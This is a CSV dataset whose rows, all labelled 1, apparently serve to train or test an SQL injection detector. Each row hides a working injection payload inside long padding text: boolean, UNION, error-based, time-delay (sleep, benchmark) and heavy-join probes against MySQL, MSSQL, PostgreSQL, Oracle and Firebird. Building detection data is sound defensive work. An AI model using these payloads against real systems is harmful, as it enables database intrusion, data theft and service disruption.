Query,Label
"It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot ""1%')));select count(*) from rdb$fields as t1 rdb$types as t2 rdb$collations as t3 ""rdb$functions as t4 and ((('%'='"""" It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lot It is better to understand a little than to misunderstand a lo",1
"The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators ""1);select count(*) from rdb$fields as t1 rdb$types as t2 rdb$collations as t3 ""rdb$functions as t4--"""" The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigators The winds and waves are always on the side of the ablest navigator",1
"rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852rhFw6hbPA85b1n4vd852 ""-5832"""") or 1650=9011--""",1
"wfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWLwfgQSYL7rCC8VW60EYWL""1) where 5464=5464 or 1022=(select count(*) from all_users t1 all_users t2 all_users t3 all_users t4 ""all_users t5)-",1
"LuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xs ""-7794"""") union all select 3910 3910 3910 3910 3910 3910 3910 3910 3910 ""3910#"""" LuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9ueyzou6xsLuWADGocNK9u",1
PgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMH -8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637 PgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMHPgDWx0yGz48cMyN3mdMH,1
"DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP DsZwJy83b2zgL9CNVosP ""-7482%"""")) or 1570=convert(int ""(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""""""""%""""""""=""""""""""""",1
"4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau4Bxvb9pMBYnc7zSgyiau ""1%"""")) and 4241=convert(int ""(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""""""""%""""""""=""""""""""""",1
"k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv k9JTajNfILUfNogSuHWv ""-3697'))) union all select 5180 5180 5180 5180 5180 5180 ""518",1
"ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ""-9405') union all select 8283 8283 8283 ""8283--"""" ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZDz ELvNBK17kegaPT0jvZD",1
LDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNl 1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('cbnc' like 'cbnc LDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNlLDORsF2lyVTYsQbqxGNl,1
"a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ ""1"""") where 6236=6236 or 8514=benchmark(5000000 ""md5(0x544d5a4c))#"""" a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ a2s04J3lwTZiriCsGSYZ ",1
"OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z ""1%"""") and elt(1210=1210 ""sleep(5)) and (""""""""%""""""""="""""""""""" OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z OZvJiSHvnR81a5Lsva3Z ",1
"3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX ""yx2zdcfzn9 ypbi9ofc02lpov4cwjuf7e6n8bbhhi5bwv2mhrs9m43a38mj6pw3z39rb83w 3j2rzc vmqkjpd0mdv8y7rz7ww9fhhk2j4c19jy 4m3hl7q6zaj8up4b5co5ylpuc0f5vt2thfnmbksp1k gd0bqlp0gtz1dbbo6o5m7207h073qw7j5iygl3h8pvg62 wx71xy4fzr001bt9wy5v5o6xpuyrft65g5e72rgdp96gw5f0n8 i452fnodxhexhzlo2g0jrjg3o5nkdaym1rilphhqq1z305usw3ig 8iicr6xqrbll6suv 06kz98znjjv573xp6fctap1q6uylj1hw2t3zd627atq9uosx1a6q9lmk38q43nxdhvqi9agy9vqg89kff6wkefoafpovswspb1ti4flezxchczjroa79pfw6gnqun337y00nzf2ku re2y1hplbrx969upcxnd76e qofauo5hvabjl40y64tyy9cn31rdcni446urnsldtjdh9wynob0mv3ybzmlpqb4i2f5yqeoqxprtl sbfy0-4695' ) ) ) union all select 5844 5844 5844 5844 5844 ""5844#"""" 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuKbBX 3i8IZ5Wuv3ySSEBuK",1
